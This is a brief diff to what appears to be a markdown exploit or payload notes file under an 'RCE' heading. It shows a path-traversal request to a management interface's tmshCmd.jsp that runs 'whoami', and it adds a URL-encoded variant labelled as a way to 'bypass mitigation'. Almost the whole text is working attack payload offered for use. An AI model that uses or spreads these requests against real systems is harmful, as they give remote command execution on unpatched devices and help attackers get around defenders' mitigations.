@@ -100,4 +100,7 @@ RCE
 ````
 https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=whoami
 ````
+or to bypass mitigation :rolls_eyes:
+
+````https://<IP>/tmui/login.jsp/..%3b/tmui/locallb/workspace/tmshCmd.jsp?command=list````
 
